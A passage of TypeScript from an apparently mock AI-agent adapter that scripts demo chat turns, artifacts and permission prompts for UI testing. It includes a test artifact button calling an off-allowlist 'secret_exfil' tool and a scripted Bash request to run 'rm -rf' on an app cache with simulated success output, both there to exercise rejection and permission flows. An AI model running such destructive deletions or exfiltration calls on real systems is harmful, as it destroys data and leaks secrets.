    let delay = this.streamText("No registry component fits this, so here's a sandboxed artifact — the buttons use the bridge.", 350);
    delay += 300;
    this.schedule(() => this.emit({ type: "status", state: "tool", label: "emit_artifact" }), delay);
    delay += 400;
    this.schedule(
      () =>
        this.emit({
          type: "artifact",
          title: "bridge demo",
          html:
            '<div style="text-align:center;padding:24px">' +
            '<h2 style="margin:0 0 12px">Counter</h2>' +
            '<button id="b" style="font-size:20px;padding:8px 24px;cursor:pointer">clicks: <span id="n">0</span></button>' +
            '<div style="margin-top:16px;display:flex;gap:8px;justify-content:center">' +
            '<button id="ls">list workspace</button>' +
            '<button id="evil">off-allowlist</button>' +
            '<button id="ask">ask for details</button>' +
            "</div>" +
            "<script>" +
            "let n=0;document.getElementById('b').onclick=()=>{document.getElementById('n').textContent=++n};" +
            "document.getElementById('ls').onclick=()=>mirafold.tool('workspace_ls');" +
            // Off-allowlist via the helper: must reach the server and be
            // rejected THERE (raw un-nonced postMessage dies client-side).
            "document.getElementById('evil').onclick=()=>mirafold.tool('secret_exfil');" +
            "document.getElementById('ask').onclick=()=>mirafold.prompt('Tell me more about this workspace.');" +
            "</script>" +
            "</div>",
          id: randomUUID(),
        }),
      delay,
    );
    this.endTurn(delay);
  }

  /** Deterministic T.3 hook: pause on a permission_request so the prompt bar
   *  is exercisable API-free. */
  private playPermissionAsk() {
    const id = randomUUID();
    this.beginTurn();
    this.schedule(() => {
      const timer = setTimeout(
        () => this.pendingAsks.get(id)?.(false),
        PERMISSION_TIMEOUT_MS,
      );
      this.timers.push(timer);
      this.pendingAsks.set(id, (allow) => {
        clearTimeout(timer);
        this.pendingAsks.delete(id);
        // Answer AND timeout resolve through here — announce it so every
        // viewport drops the bar, mirroring the real adapter's contract
        // (protocol.ts permission_resolved).
        this.emit({ type: "permission_resolved", id, allow });
        if (allow) this.playDangerousAllowed();
        else this.playDangerousDenied();
      });
      this.emit({
        type: "permission_request",
        tool: "Bash",
        detail: "rm -rf /var/cache/app && systemctl restart app",
        id,
      });
    }, 450);
  }

  /** A canned turn off the shuffled template deck: thinking, 1–2 tool
   *  use/result pairs, the streamed reply, one rendered component, usage. */
  private playTemplateTurn(text: string) {
    if (this.deck.length === 0) this.deck = shuffled(TEMPLATES.map((_, i) => i));
    const reply = TEMPLATES[this.deck.pop()!](text);

    let delay = 120;
    this.beginTurn();
    // A short scripted thought streams before the work starts (T2.1).
    const thought =
      "Reading the prompt again — the useful answer here is a quick check of " +
      "current state, then a compact summary with one component that fits the " +
      "data instead of a wall of prose. Gathering that first.";
    for (const chunk of thought.match(/.{1,18}/gs) ?? []) {
      delay += 11;
      this.schedule(() => this.emit({ type: "thinking_delta", text: chunk }), delay);
    }
    delay += 200;
    // Drawn without replacement — two identical tool rows in one turn read
    // as a rendering bug to a first-time viewer (R.4b).
    for (const factory of shuffled(MOCK_TOOLS).slice(0, randInt(1, 2))) {
      const t = factory();
      const id = randomUUID();
      delay += randInt(250, 550);
      this.schedule(() => {
        this.emit({ type: "status", state: "tool", label: t.name });
        this.emit({ type: "tool_use", name: t.name, detail: t.detail, id, input: t.input });
      }, delay);
      delay += randInt(300, 700);
      const capped = capOutput(t.output);
      this.schedule(
        () =>
          this.emit({
            type: "tool_result",
            output: capped.text,
            truncatedBytes: capped.truncatedBytes,
            isError: t.isError,
            id,
          }),
        delay,
      );
    }
    delay = this.streamText(reply, delay + 250, 12);
    // Every mock turn ends with a rendered component so the Phase 1 pipeline
    // is exercised without an API key.
    const { component, props } = pick(MOCK_RENDERS)();
    const label = RENDER_TOOL_BY_COMPONENT.get(component) ?? `render_${component}`;
    delay += 300;
    this.schedule(() => this.emit({ type: "status", state: "tool", label }), delay);
    delay += 400;
    this.paintRender(delay, component, props);
    // Per-turn tokens so the meters run — but NO costUsd: a fabricated
    // dollar figure is the one number a demo viewer takes as real (R.4b;
    // omitted → the status bar shows no cost at all) (T2.6).
    const inTok = randInt(1800, 7200);
    const outTok = randInt(200, 900);
    this.schedule(
      () =>
        this.emit({
          type: "usage",
          model: "mock-sonnet",
          inputTokens: inTok,
          outputTokens: outTok,
        }),
      delay + 20,
    );
    this.endTurn(delay);
  }

  /** Deterministic UX.2 hook: two successful actions fold together after the
   * turn, while the failed action remains an honest top-level row. */
  private playToolActivity() {
    const calls = [
      {
        name: "Read",
        detail: "server/protocol.ts",
        output: "Read 42 lines",
      },
      {
        name: "Bash",
        detail: "yarn typecheck",
        output: "Done in 1.2s",
      },
      {
        name: "Bash",
        detail: "yarn test focused-missing.test.ts",
        output: "No matching test file",
        isError: true,
      },
    ];
    this.beginTurn();
    let delay = 80;
    for (const call of calls) {
      const id = randomUUID();
      this.schedule(() => {
        this.emit({ type: "status", state: "tool", label: call.name });
        this.emit({
          type: "tool_use",
          name: call.name,
          detail: call.detail,
          id,
        });
      }, delay);
      delay += 90;
      this.schedule(
        () =>
          this.emit({
            type: "tool_result",
            output: call.output,
            ...(call.isError ? { isError: true } : {}),
            id,
          }),
        delay,
      );
      delay += 40;
    }
    this.schedule(
      () => this.emit({ type: "text_delta", text: "Tool activity complete." }),
      delay,
    );
    this.endTurn(delay + 40);
  }

  /** Emit a one-artifact turn: brief text, then the artifact (Step 3.4 hooks). */
  private playArtifact(title: string, html: string) {
    this.beginTurn();
    let delay = this.streamText(`Here's the ${title} artifact.`, 300);
    delay += 250;
    this.schedule(() => this.emit({ type: "status", state: "tool", label: "emit_artifact" }), delay);
    delay += 350;
    this.schedule(() => this.emit({ type: "artifact", title, html, id: randomUUID() }), delay);
    this.endTurn(delay);
  }

  /** ONE artifact id, three htmls in quick succession — deliberately inside
   *  the shell's liveness grace window: a stale deadline from an earlier
   *  html's load used to kill the healthy update as "navigation"
   *  (2026-07-29 bughunt). */
  private playUpdatingArtifact() {
    const id = randomUUID();
    this.beginTurn();
    let delay = this.streamText("Watch it update in place.", 300);
    delay += 250;
    this.schedule(() => this.emit({ type: "status", state: "tool", label: "emit_artifact" }), delay);
    delay += 350;
    for (const v of [1, 2, 3]) {
      this.schedule(
        () =>
          this.emit({
            type: "artifact",
            title: "updating demo",
            html: `<h2>version ${v}</h2>`,
            id,
          }),
        delay,
      );
      delay += 180;
    }
    this.endTurn(delay);
  }

  /** Continuation after the permission prompt was allowed: run the "command". */
  private playDangerousAllowed() {
    const id = randomUUID();
    this.schedule(() => {
      this.emit({ type: "status", state: "tool", label: "Bash" });
      this.emit({
        type: "tool_use",
        name: "Bash",
        detail: "rm -rf /var/cache/app && systemctl restart app",
        id,
      });
    }, 150);
    this.schedule(
      () =>
        this.emit({
          type: "tool_result",
          output: `removed ${randInt(80, 400)} files (${randInt(40, 900)} MB)\napp.service restarted — active (running)`,
          id,
        }),
      900,
    );
    const delay = this.streamText("Cache cleared and the service restarted cleanly. ✅", 1100);
    this.endTurn(delay, 60);
  }

  /** Continuation after the permission prompt was denied (or timed out). */
  private playDangerousDenied() {
    const delay = this.streamText("Understood — I won't run that command. Nothing was changed.", 150);
    this.endTurn(delay, 60);
  }

  private emit(msg: WireMsg) {
    for (const cb of this.listeners) cb(msg);
  }

  private schedule(fn: () => void, ms: number) {
    this.timers.push(setTimeout(fn, ms));
  }

  /** Cancel the in-flight turn's remaining schedule. Everything still
   *  scheduled belongs to that turn; abandoned permission prompts die with
   *  it (deny by default). */
  private abandonTurn() {
    for (const t of this.timers) clearTimeout(t);
    this.timers = [];
    // protocol.ts: permission_resolved MUST fire on EVERY resolution path —
    // interrupt/close included, or a second viewport keeps a dead bar and
    // the replay buffer holds an unresolved ask forever (2026-07-29
    // bughunt). Emitted directly, not through the resolver: its scripted
    // follow-up belongs to the turn being abandoned.
    for (const id of this.pendingAsks.keys()) {
      this.emit({ type: "permission_resolved", id, allow: false });
    }
    this.pendingAsks.clear();
  }

  /** Open the scripted turn envelope: `status: thinking` at t=0. */
  private beginTurn() {
    this.openTurns++;
    this.schedule(() => this.emit({ type: "status", state: "thinking" }), 0);
  }

  /** Close the envelope: `turn_end` at `at + pad` ms. */
  private endTurn(at: number, pad = 40) {
    this.schedule(() => {
      this.openTurns = Math.max(0, this.openTurns - 1);
      this.emit({ type: "turn_end" });
    }, at + pad);
  }

  /** Schedules one render paint at `at` ms — the hooks' shared brushstroke.
   *  Pass an explicit `id` to repaint the same component (update-in-place). */
  private paintRender(
    at: number,
    component: string,
    props: Record<string, unknown>,
    id = randomUUID(),
  ) {
    this.schedule(() => this.emit({ type: "render", component, props, id }), at);
  }

  /** Schedule `text` as 16-char text_delta chunks, the first `per` ms after
   *  `from` and one every `per` ms; returns the delay cursor past the last. */
  private streamText(text: string, from: number, per = 14): number {
    let delay = from;
    for (const chunk of text.match(/.{1,16}/gs) ?? []) {
      delay += per;
      this.schedule(() => this.emit({ type: "text_delta", text: chunk }), delay);
    }
    return delay;
  }
}
